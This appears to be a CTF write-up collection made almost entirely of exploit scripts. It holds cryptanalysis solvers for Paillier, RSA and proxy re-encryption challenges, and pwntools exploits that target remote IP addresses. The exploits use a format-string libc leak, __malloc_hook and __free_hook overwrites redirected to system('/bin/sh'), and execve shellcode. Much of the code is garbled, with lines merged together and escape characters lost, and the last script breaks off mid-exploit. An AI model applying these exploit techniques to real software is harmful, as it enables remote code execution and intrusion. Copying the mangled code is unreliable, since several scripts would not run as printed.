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'
```



```
from pwn import *
from Crypto.Util.number import *
from itertools import product
from hashlib import sha256
from tqdm import tqdm
from math import gcd
import random
from gmpy2 import invert

ip = "47.104.85.225"
port = 57811

String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz"

# context.log_level = "debug"

key_double = set([119,718])
key_single = set([241,647])
# key_single,key_double = {128, 129, 641, 646, 647, 780, 396, 526, 653, 400, 918, 281, 286, 542, 158, 548, 936, 810, 430, 944, 309, 186, 201, 461, 333, 977, 727, 216, 860, 613, 232, 745, 877, 237, 241, 113, 244, 888, 121, 123} ,{130, 899, 903, 521, 142, 271, 783, 530, 148, 416, 288, 550, 939, 427, 299, 685, 942, 558, 307, 566, 184, 313, 577, 585, 718, 983, 349, 611, 355, 995, 614, 746, 751, 114, 498, 885, 119, 637, 638, 639}

def login(sh):
    t = sh.recvline().decode().strip()
    suffix = t[10:22]
    target = t[27:]
    for i in tqdm(product(String,repeat=4)):
        guess = "".join(i)
        if sha256((guess+suffix).encode()).hexdigest() == target:
            print("found!! %s"%guess)
            sh.sendline(guess)
            break

def enc(n, g, m):
    while 1:
        r = random.randint(2, n - 1)
        if gcd(r, n) == 1:
            break
    c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2)
    return c

def round(sh):
    sh.recvuntil("Step 1 - KeyGen. This is my public key.")
    sh.recvuntil("n = ")
    n = int(sh.recvline().strip().decode())
    sh.recvuntil("g = ")
    g = int(sh.recvline().strip().decode())
    sh.recvuntil("Please give me one decimal ciphertext.n")
    sh.sendline("23333")
    # sh.sendline(enc(n,g,2333))
    sh.sendlineafter("Give me m0.","5")
    sh.sendlineafter("Give me m1.","7")
    sh.recvuntil("This is a ciphertext.n")
    c = int(sh.recvline().decode().strip())
    inv = invert(35,n)
    payload = pow(c,inv,n**2)
    sh.sendlineafter("Please give me one decimal ciphertext n",str(payload))
    sh.recvuntil("This is the corresponding plaintext.n")
    plain = int(sh.recvline().decode().strip())
    assert plain < 1000
    choice = "0"
    if plain in key_double:
        choice = "0"
    elif plain in key_single:
        choice = "1"
    elif len(key_double) ==40:
        choice = "1"
    sh.sendlineafter("0 or 1(m0 -> c0 , m1 -> c1)?n", choice)
    ans = sh.recvline()
    if choice == "0":
        if b"Good!" in ans:
            key_double.add(plain)
            return True
        else:
            key_single.add(plain)
            return False
    else:
        return True

def collect():
    while len(key_single)<40 and len(key_double) < 40:
        sh = remote(ip, port)
        login(sh)
        for _ in range(32):
            print("round"+str(_+1))
            if round(sh):
                if _ == 31:
                    sh.interactive()
                    return key_single,key_double
                else:
                    continue
            else:
                sh.close()
                break
        print(key_single,key_double)
    # print(key_single,key_double)
    return key_single,key_double

def attack():
    sh = remote(ip, port)
    login(sh)
    for _ in range(32):
        print("round" + str(_ + 1))
        round(sh)
    sh.interactive()

collect()
attack()
```



```
enc2 = 477792241947598997755707508714799801381043276134552303251302800229708190913567148170349032795307939742423206665534169527810046863819675887767497377300799726067442546659727724319166674283784377446858971240083044087636247731336026245595276739105564137231124069919204480843295256246238314333764415330112155998965648279578575928882016679571458394145032660284980969384007309509174474014691293829136473472657096337779640266326414800785917874153650863059253773024274723654336312983896947146419353084709524578507890787105507521501572366812306358503816661138416471814342103667935846273429704628076891016686914820863428399748385787198706279799241114667004712095459127662559498327329298292905810678824179245793248152436437212311618471861666784665064982265334976783916920793003110946
enc1 = 324085184716569811242139631602073182714501812301067906743757281289763949259574867321768455807067845270445454313631940851879397399660115830930721977325166647972918520712692537455826951432928818019379944415524541701213822089379411169655476177771557629013692555621245403872780846050234289972763538606200519292816810781008026710829177836788318447020320663173741828697206685166367967006507652514479424627429196603772489842787011644692411859731490523680753467985118101010978849886159541286289767972156028074743113099358755869730651038195533340957491049487565803345868613388312443443248785061843203619681115052743625298129895073030257014600583626044262403317927685246678967918794735881483413605213999511850829379012910795098448310102505285466302715781303189313612059346920425380
n = 81599949711549154635465214618011873859598700959420752615065791074906316164999655226134504405055906605123107941233747700488552850894864866310507426463856438597931724770356731064198138613164351881921156415967244440147610674345623021323451709090267744028494268168052906605163235661364155027190253970750580696927
c1  = pow(bytes_to_long("23333333"),e,n)
xy = 0
target = (enc1-enc1%c1)//c1 -4*n
def fun(x):
    x**3 - x**2 + x
while l +1 < r:
    middle = (l+r)//2
    if fun(middle)<target:
        l = middle
    else:
        r = middle
p_add_q = l
# 18204333246560768560872725482961228172564560432233174722254454173420970718077567864761210335166570076412523290930652187515007977940968189052488027261733672
```



```
{p: 10219971403378536469232349334322767760973148102350019205050022884237609949575414503151788893141355922159125152487712362360371057262676339926203921524191899, q: 7984361843182232091640376148638460411591412329883155517204431289183360768502153361609421442025214154253398138442939825154636920678291849126284105737541773}
```



```
from Crypto.Util.number import *
p=10219971403378536469232349334322767760973148102350019205050022884237609949575414503151788893141355922159125152487712362360371057262676339926203921524191899
q= 7984361843182232091640376148638460411591412329883155517204431289183360768502153361609421442025214154253398138442939825154636920678291849126284105737541773
e = 65537
y = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1)
x = 2*p*q + p + q
enc2 =  477792241947598997755707508714799801381043276134552303251302800229708190913567148170349032795307939742423206665534169527810046863819675887767497377300799726067442546659727724319166674283784377446858971240083044087636247731336026245595276739105564137231124069919204480843295256246238314333764415330112155998965648279578575928882016679571458394145032660284980969384007309509174474014691293829136473472657096337779640266326414800785917874153650863059253773024274723654336312983896947146419353084709524578507890787105507521501572366812306358503816661138416471814342103667935846273429704628076891016686914820863428399748385787198706279799241114667004712095459127662559498327329298292905810678824179245793248152436437212311618471861666784665064982265334976783916920793003110946
z = enc2 % (x+y)
n = 81599949711549154635465214618011873859598700959420752615065791074906316164999655226134504405055906605123107941233747700488552850894864866310507426463856438597931724770356731064198138613164351881921156415967244440147610674345623021323451709090267744028494268168052906605163235661364155027190253970750580696927
enc = enc2 - z
flag_enc = enc // (x+y)
d = inverse(e,(p-1)*(q-1))
print(long_to_bytes(pow(flag_enc,d,n)))
```



```
# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""

from Crypto.Util.number import *
import gmpy2
import libnum
import random
import binascii
import os

flag=r'flag{}'

n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391
c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151
e = 65537
#rands=[[58, 53, 122],[145, 124, 244],[5, 19, 192],[255, 23, 64],[57, 113, 194],[246, 205, 162],[112, 87, 95],[215, 147, 105],[16, 131, 38],[234, 36, 46],[68, 61, 146],[148, 61, 9],[139, 77, 32],[96, 56, 160],[121, 76, 17],[114, 246, 92],[178, 206, 60],[168, 147, 26],[168, 41, 68],[24, 93, 84],[175, 43, 88],[147, 97, 153],[42, 94, 45],[150, 103, 127],[68, 163, 62],[165, 37, 89],[219, 248, 59],[241, 182, 8],[140, 211, 146],[88, 226, 2],[48, 150, 56],[87, 109, 255],[227, 216, 65],[23, 190, 10],[5, 25, 64],[6, 12, 124],[53, 113, 124],[255, 192, 158],[61, 239, 5],[62, 108, 86],[123, 44, 64],[195, 192, 30],[30, 82, 95],[56, 178, 165],[68, 77, 239],[106, 247, 226],[17, 46, 114],[91, 71, 156],[157, 43, 182],[146, 6, 42],[148, 143, 161],[108, 33, 139],[139, 169, 157],[71, 140, 25],[28, 153, 26],[241, 221, 235],[28, 131, 141],[159, 111, 184],[47, 206, 11],[220, 152, 157],[41, 213, 97],[4, 220, 10],[77, 13, 248],[94, 140, 110],[25, 250, 226],[218, 102, 109],[189, 238, 66],[91, 18, 131],[23, 239, 190],[159, 33, 72],[183, 78, 208],[209, 213, 101],[111, 50, 220],[166, 104, 233],[170, 144, 10],[187, 87, 175],[195, 59, 104],[165, 179, 179],[99, 247, 153],[195, 61, 100],[223, 159, 165],[230, 93, 184],[87, 28, 35],[35, 122, 38],[158, 188, 163],[229, 192, 222],[12, 12, 192],[207, 95, 224],[127, 113, 137],[22, 114, 143],[13, 45, 144],[70, 140, 211],[57, 101, 42],[132, 62, 129],[40, 128, 124],[1, 132, 161],[164, 33, 133],[252, 201, 32],[8, 18, 247],[1, 88, 55],[201, 135, 186],[101, 254, 125],[236, 196, 39],[148, 24, 103],[101, 29, 253],[97, 156, 64],[90, 103, 91],[50, 48, 80],[206, 22, 93],[11, 114, 174],[61, 132, 247],[215, 32, 232],[95, 128, 90],[57, 35, 228],[163, 143, 107],[178, 250, 28],[64, 107, 225],[106, 115, 207],[85, 134, 21],[118, 201, 76],[234, 34, 22],[241, 236, 122],[111, 185, 127],[1, 26, 164],[254, 57, 117],[243, 27, 32],[161, 88, 80],[50, 165, 93],[87, 182, 216],[184, 159, 63],[167, 166, 123],[37, 78, 33],[186, 81, 58],[48, 3, 239],[70, 186, 13],[56, 108, 178],[54, 55, 235],[105, 180, 105],[16, 194, 98],[136, 11, 41],[18, 203, 79],[185, 114, 170],[148, 181, 223],[118, 57, 160],[23, 250, 181],[235, 219, 228],[44, 151, 38],[185, 224, 134],[42, 162, 122],[3, 9, 158],[129, 245, 2],[66, 241, 92],[80, 124, 36]]
res=[55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]
seeds=[4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]

ress = ""

for i in range(0,154):
    random.seed(seeds[i])
    rands = []
    for j in range(0,4):
        rands.append(random.randint(0,255))
    #print(rands)
    ress+=chr((res[i]) ^ rands[i%4])
print(ress)

dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057
import gmpy2 

for x in range(1, e):
    if(e*dp%x==1):
        p=(e*dp-1)//x+1
        if(n%p!=0):
            continue
        q=n//p
        phin=(p-1)*(q-1)
        d=gmpy2.invert(e, phin)
        m=pow(c, d, n)
        if(len(hex(m)[2:])%2==1):
            continue
            
        print("m:",m)
        #print(hex(m)[2:])
        print("flag:",bytes.fromhex(hex(m)[2:]))
```



```
group_list = [32, 64, 128, 256]for group in group_list:    m = getrandbits(200)    plaintext = n2s(m)    cur_cipher = enc(plaintext, pk_of_one_user)    rk, encoder, prefix = rk_gen(sk_of_one_user, pk, group=group)    mul *= rk    mul %= p    new_cipher = re_enc(rk, cur_cipher)    self.request.sendall('The cipher shared to youn' + str(new_cipher) + 'n')    self.request.sendall('prefix, encoder = ' + str((encoder, prefix.encode('hex'))) + 'n')    ans = self.request.recv(1024).strip()    if int(ans, 16) != m:        exit(1)        self.request.sendall('You are a clever boy! Now I can share you some other information!n' + hex(mul) + 'n')
```



```
def rk_gen(sk, pki, group=9):    x, r = getrandbits(512) % p, getrandbits(512) % p    prefix = n2s(pow(g, x * sk, p)).rjust(64, 'x00')    encoder = [1, -pow(pki, x * sk, p) % p]    for i in range(1, group + 1):        pkj = getrandbits(512)        new_encoder = [1]        cur = pow(pkj, x * sk, p)        for j in range(1, i + 1):            new_encoder.append((encoder[j] + (-1) * cur * encoder[j - 1]) % p)        new_encoder.append(encoder[i] * cur * (-1) % p)        encoder = new_encoder    encoder[-1] += r    dd = h2(prefix + n2s(r).rjust(64, 'x00')) | 1    rk = sk * dd    return rk, encoder[1:], prefix
```



```
encoder = [1,m] # inital encoderencoder = [1,m-c1,-c1*m] # round 1encoder = [1,m-c1-c2,-c1*m-c2*(m-c1),c1*c2*m] #round2encoder = [1,m-sum(c1..c32),.....,product(c1...c32)*m]# round32known_encoder = [1,m-sum(c1..c32),.....,product(c1...c32)*m+r]# 用户获取到的encoder
```



```
a = (-pow(bytes_to_long(prefix),sk,p))%ppre = 1for enc in encoder:    pre = (enc-pre*a)%pprint(pre)# r = pre
```



```
from pwn import * from random import getrandbitsfrom hashlib import sha256from Crypto.Util.number import *def n2s(n):    return long_to_bytes(n)def s2n(n):    return bytes_to_long(n)def h2(m):    return int(sha256(m).hexdigest(), 16)def key_gen(nbits):    s = getrandbits(nbits) % p    while s.bit_length() < nbits - 2:        s = getrandbits(nbits) % p    pk = pow(g, s, p)    return pk, sdef enc(m, pk):    m = s2n(m)    e, v = getrandbits(256), getrandbits(256)    E, V = pow(g, e, p), pow(g, v, p)    s = v + e * h2(n2s(E) + n2s(V))    c = m * pow(pk, e + v, p) % p    cap = (E, V, s)    return c, capp, g = ...#context.log_level = 'debug'sh = remote("47.104.85.225","62351")#sh = remote("0.0.0.0","1213")sh.recvuntil("choice>")sh.sendline("1")sh.recvuntil("Please take good care of it!n")tmp = sh.recvuntil("n")[:-1]#获取自己的pk和skpk,sk = eval(tmp)B=[]sh.recvuntil("choice>")sh.sendline("2")for _ in range(4): sh.recvuntil("The cipher shared to youn") tmp = sh.recvuntil("n")[:-1]  #获取到 re_enc(m) 后给的 c, (E_, V_, s_) c, (E_, V_, s_) = eval(tmp) sh.recvuntil("prefix, encoder = ") tmp = sh.recvuntil("n")[:-1]  #利用 encoder,prefix 获取r，从而得到dd encoder,prefix = eval(tmp) prefixx = prefix.decode('hex') prefix = int(prefix,16) x = -pow(prefix,sk,p)%p tmp=1 for i in encoder[:-1]:  tmp = (i-tmp*x)%p r = (encoder[-1] - tmp*x)%p prefix = n2s(pow(g, x * sk, p)).rjust(64, 'x00') dd = h2(prefixx + n2s(r).rjust(64, 'x00')) | 1 B.append(dd) dd_ = inverse(dd,p-1)  #有了dd，利用前面得到的c, E_ * V_ 解密m    m = inverse(pow(E_*V_,dd_,p),p)*c % p sh.sendline(hex(m)[2:])sh.recvuntil("You are a clever boy! Now I can share you some other information!n")tmp = sh.recvuntil("n")[:-1]#拿着通关后给的mul，待会去开根mul = eval(tmp)sh.recvuntil("choice>")sh.sendline("3")tmp = sh.recvuntil("n")[:-1]#获取flag密文相关的参数c, (E, V, s) = eval(tmp)#dd求逆乘以mul，把原来mul里的dd去掉，得到sk^4for i in B: mul = mul * inverse(i,p) % psk_4 = mul sh.interactive()'''a,b = Mod(sk_4,p).nth_root(4,all=True)tmp = pow(int(E*V),int(a),int(p))m = c * inverse_mod(int(tmp),int(p)) % int(p)print(long_to_bytes(m))tmp = pow(int(E*V),int(b),int(p))m = c * inverse_mod(int(tmp),int(p)) % int(p)print(long_to_bytes(m))'''
```



```
from pwn import *
context.log_level = "debug"
#p = process("./note")
libc = ELF("./libc-2.23.so")
#p = process(["/home/hacker/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so", "./note"],
#            env={"LD_PRELOAD":"/home/hacker/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so"})
p = remote("47.104.70.90",25315)
elf = ELF("./note")

def add(size,content):
 p.recvuntil("choice: ")
 p.sendline("1")
 p.sendlineafter("size: ",str(size))
 p.sendlineafter("content: ",content)
 p.recvuntil("addr: ")
 #heap_addr = int(p.recv(6).ljust(8,"x00"))

def show():
 p.recvuntil("choice: ")
 p.sendline("3")
 p.recvuntil("content:")
 content = p.recv()

p.recvuntil("choice: ") 
p.sendline("2")
p.recvuntil("say ? ")
p.sendline("%7$sx00")

payload = p64(0xfbad1800) + p64(0)*3
p.sendline(payload)
raw_input()

libc_base = u64(p.recvuntil("x7f")[-6:].ljust(8,"x00")) -0x3c36e0
malloc_hook = libc_base + libc.sym["__malloc_hook"]
success("libc_base:"+hex(libc_base))
success("malloc_hook:"+hex(malloc_hook))
rce =0x4527a + libc_base

realloc = libc_base + libc.sym["realloc"] 
realloc_hook = libc_base + libc.sym["__realloc_hook"]

payload = "%7$sx00x00x00x00"+p64(realloc_hook)
p.recvuntil("choice: ")
p.sendline("2")
p.recvuntil("say ? ")
p.sendline(payload)
raw_input()
#gdb.attach(p)
payload = p64(rce) + p64(realloc+6)
p.recvuntil("? ")
p.sendline(payload)

p.sendlineafter("choice:","1")
p.sendlineafter("size:","2")

p.interactive()
```



```
from pwn import *
context.log_level = 'debug'

p = remote("47.104.70.90", 34524)
def add(idx, name, size, msg):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("emon: n", str(idx))
    p.sendafter("emon: n", name)
    p.sendlineafter("emon: n", str(size))
    if size <= 0x400:
        p.sendafter("age: n", msg)
def add1(idx, name, size, msg):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("emon: ", str(idx))
    p.sendafter("emon: ", name)
    p.sendlineafter("emon: ", str(size))
    if size <= 0x400:
        p.sendafter("age: ", msg)
def show(idx):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("emon : n", str(idx))
def free(idx):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("emon : n", str(idx))
def free1(idx):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("emon : ", str(idx))
def edit(idx, msg):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("lemon  : n", str(idx))
    p.sendafter("color!n", msg)
def exp():
    p.sendlineafter("me?n", "yes")
    p.sendafter("number: n", "111111")

    p.sendafter("first: n", "1"*0x10+p32(0x300)+'x01')
    p.recvuntil("0x")
    low = int(p.recv(3),16)
    print hex(low)
    #gdb.attach(p)
    edit(-260, "1"*0x138+p16(low+0xe000-0x40))

    add(0, "A", 0x500, "a")
    free(0)
    add(1, "x10", 0x10, "a")
    add(0, "x10", 0x10, "a")
    add(0, "x20", 0x500, "a")

    p.interactive()
if __name__ == '__main__':
    exp()
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
#p = process('./pwdFree')
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so.6")
p = remote("47.104.71.220", 38562)
def add(id, size, content):
 p.sendlineafter("Choice:", "1")
 p.sendlineafter("Save:", id)
 p.sendlineafter("Of Your Pwd:", str(size))
 p.sendafter("Your Pwd:", content)
def show(idx):
 p.sendlineafter("Choice:", "3")
 p.sendlineafter("", str(idx))
def edit(idx, content):
 p.sendlineafter("Choice:", "2")
 p.sendline(str(idx))
 p.send(content)
def free(idx):
 p.sendlineafter("Choice:", "4")
 p.sendlineafter("Delete:", str(idx))

def exp():
 for i in range(8):
  add("a", 0xf0, "an")
  if i ==0:
   p.recvuntil("ID:")
   key = u64(p.recv(8))^0xa61
   print(hex(key))
 add("a", 0x18, "an")
 add("a", 0xf0, "an")
 add("a", 0x18, "an")
 free(8)
 
 add("a", 0x18, "A"*0x19)
 free(8)
 add("a", 0x18, "A"*0x10+p64(0x820^key)+'n')
 for i in range(8):
  free(7-i)
 free(9)
 
 for i in range(8):
  add("a", 0xf0, "an")
 show(0)
 p.recvuntil("Pwd is: ")
 libc.address = (u64(p.recv(8))^key)-0x7ffff7dcdca0+0x7ffff79e2000
 print(hex(libc.address))
 free(2)
 free(1)
 
 add("a", 0x60, "an")
 
 add("a", 0x100, "A"*0x90+p64(libc.sym["__free_hook"]^key)+'n')
 add("a", 0xf0, p64(u64("/bin/shx00")^key)+"n")
 add("a", 0xf0, p64(libc.sym["system"]^key)+'n')
 free(9)

 p.interactive()
if __name__ == '__main__':
 exp()
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./pwdPro')
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so")
p = remote("47.104.71.220", 49261)
def add(idx, id, size, content="an"):
 p.sendlineafter("Choice:", "1")
 p.sendlineafter("Add:", str(idx))
 p.sendlineafter("Save:", id)
 p.sendlineafter("Of Your Pwd:", str(size))
 p.sendafter("Your Pwd:", content)
def show(idx):
 p.sendlineafter("Choice:", "3")
 p.sendlineafter("", str(idx))
def edit(idx, content):
 p.sendlineafter("Choice:", "2")
 p.sendlineafter("Edit:", str(idx))
 p.send(content)
def free(idx):
 p.sendlineafter("Choice:", "4")
 p.sendlineafter("Delete:", str(idx))
def re(idx):
 p.sendlineafter("Choice:", "5")
 p.sendlineafter("Recover:", str(idx))

def exp():
 add(0, "a", 0x450, "a"*8+'n')
 p.recvuntil("ID:")
 key = u64(p.recv(8))^0x6161616161616161
 print(hex(key))
 
 add(1, "a", 0x420)
 free(0)
 re(0)
 show(0)
 p.recvuntil("Pwd is: ")

 libc.address = (u64(p.recv(8))^key)-0x7ffff7fabbe0+0x7ffff7dc0000
 print(hex(libc.address))
 #0x1eb2d8

 add(0, "a", 0x450)
 add(2, "a", 0x440)
 add(3, "a", 0x420)
 free(0)
 add(4, "a", 0x600)
 free(2)
 re(0)
 show(0)
 p.recvuntil("Pwd is: ")
 p.recv(0x10)
 heap_addr = u64(p.recv(8))^key
 print(hex(heap_addr))
 edit(0, p64(libc.address-0x7ffff7dc0000+0x00007ffff7fac010)*2+p64(heap_addr)+p64(libc.address+0x1eb2d8-0x20-4)+'n')
 #
 add(10, "a", 0x600)
 add(11, "a", 0x800, p64(u64("/bin/shx00")^key)+"n")
 
 free(10)
 edit(0, "A"*0xe8+p64(libc.sym['__free_hook']))
 add(12, "a", 0x600, p64(libc.sym['system']^key)+'n')
 free(11)

 p.interactive()
if __name__ == '__main__':
 exp()
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./JigSAW')
context.arch = "amd64"
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so")
p = remote("47.104.71.220", 10273)
def add(idx):
 p.sendlineafter("Choice :", "1")
 p.sendlineafter("Index? :", str(idx))
def show(idx):
 p.sendlineafter("Choice :", "5")
 p.sendlineafter("Index? :", str(idx))
def edit(idx, content):
 p.sendlineafter("Choice :", "2")
 p.sendlineafter("Index? :", str(idx))
 p.sendafter("iNput:", content)
def free(idx):
 p.sendlineafter("Choice :", "3")
 p.sendlineafter("Index? :", str(idx))
def test(idx):
 p.sendlineafter("Choice :", "4")
 p.sendlineafter("Index? :", str(idx))
def exp():
 shellcode1 = asm("mov rsp, rdxnadd rsp, 0x20npush rsp")
 shellcode2 = asm("mov rax, 0x68732f6e69622fnadd rsp, 0x20npush rsp")

 shellcode3 = asm("push raxnmov rdi, rspnxor rsi, rsinadd rsp, 0x28npush rsp")
 shellcode4 = asm("xor rdx, rdxnmov rax, 59nsyscalln")
 print(len(shellcode1))
 p.sendlineafter("Name:", "111")
 p.sendlineafter("Choice:", str(0x100000000))
 add(0)
 add(1)
 add(2)
 add(3)
 edit(0, shellcode1)
 edit(1, shellcode2)
